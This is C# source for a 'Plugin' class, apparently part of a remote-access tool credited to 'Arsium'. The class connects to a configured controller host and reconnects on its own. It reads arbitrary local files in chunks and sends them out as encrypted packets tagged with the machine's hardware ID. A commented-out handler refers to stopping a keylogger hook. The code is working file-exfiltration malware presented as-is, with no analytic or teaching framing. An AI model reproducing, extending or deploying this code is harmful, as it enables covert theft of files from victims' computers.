using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class DownloadClientHandler : IDisposable
    {
        internal readonly int BUFFER_CHUNK_SIZE = 524288;//524288 (1024 * 512) // 1048576 = 1MB (1024*1024) // 2097152 (1024 * 2048) // 4194304 (2048 * 2048)
        public LoadingAPI loadingAPI { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public long fileTicket { get; set; }
        public bool hasToExit { get; set; }


        public delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        public ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;


        public delegate byte[] ReadDataAsync();
        public delegate IPacket ReadPacketAsync(byte[] BufferPacket);

        public ReadDataAsync readDataAsync;
        public ReadPacketAsync readPacketAsync;

        public DownloadClientHandler(LoadingAPI loadingAPI, long fileTicket, int bufferSize = 524288) : base()
        {
            this.loadingAPI = loadingAPI;
            this.fileTicket = fileTicket;
            BUFFER_CHUNK_SIZE = bufferSize;
            sendDataAsync = new SendDataAsync(SendData);
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
        }


        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(loadingAPI.Host.host, loadingAPI.Host.port);
                return true;
            }
            catch { }
            return false;
        }

        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);

            if (!Connected)
            {
                ConnectStart();
            }
            /*else
            {
                Receive();
            }*/
        }


        public void Receive()
        {
            if (hasToExit)
            {
                this.Dispose();
                return;
            }

            if (Connected)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                ConnectStart();
        }

        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                if (Connected)
                    hasToExit = true;

                Connected = false;
                return null;
            }
        }
        public void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && data.Length > 0 && Connected)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);

            Receive();
        }


        private IPacket PacketParser(byte[] BufferPacket)
        {
            return BufferPacket.DeserializePacket(loadingAPI.Key);
        }
        public void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);
            ParsePacket(packet);
        }

        public void ParsePacket(IPacket packet)
        {
            return;
            /*switch (packet.packetType)
            {
                case PacketType.KEYLOG_OFF:
                    this.hasToExit = true;
                    KeyLib.Hook.AbortHook();
                    break;
            }*/
        }

        internal void StartSendingFile(string filePath) 
        {
            using (Stream source = File.OpenRead(filePath))
            {
                byte[] buffer = new byte[BUFFER_CHUNK_SIZE];//1MB 
                int bytesRead = 0;
                long totalSize = new FileInfo(filePath).Length;

                if (totalSize > BUFFER_CHUNK_SIZE)
                {
                    while ((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        Thread.Sleep(100);
                        DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.BaseIp, loadingAPI.HWID, this.fileTicket);
                        IAsyncResult ar = sendDataAsync.BeginInvoke(packetFile, null, null);
                        Thread.Sleep(75);
       
                        int size = sendDataAsync.EndInvoke(ar);

                        totalSize -= bytesRead;
                        if (totalSize < BUFFER_CHUNK_SIZE)
                            buffer = new byte[totalSize];
                    }
                }
                else 
                {
                    buffer = new byte[totalSize];
                    source.Read(buffer, 0, buffer.Length);
                    DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.BaseIp, loadingAPI.HWID, this.fileTicket);
                    IAsyncResult ar = sendDataAsync.BeginInvoke(packetFile, null, null);
                    int size = sendDataAsync.EndInvoke(ar);
                }
            }
            this.Dispose();
        }

        private int SendData(IPacket data)
        {
            byte[] encryptedData = data.SerializePacket(loadingAPI.Key);

            int total = 0;
            int size = encryptedData.Length;
            int datalft = size;
            byte[] header = new byte[5];

            byte[] temp = BitConverter.GetBytes(size);

            header[0] = temp[0];
            header[1] = temp[1];
            header[2] = temp[2];
            header[3] = temp[3];
            header[4] = (byte)data.PacketType;

            lock (socket)
            {
                try
                {
                    socket.Poll(-1, SelectMode.SelectWrite);
                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return size;
                }

                catch (Exception)
                {
                    Connected = false;
                    return 0;
                }
            }
        }

        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
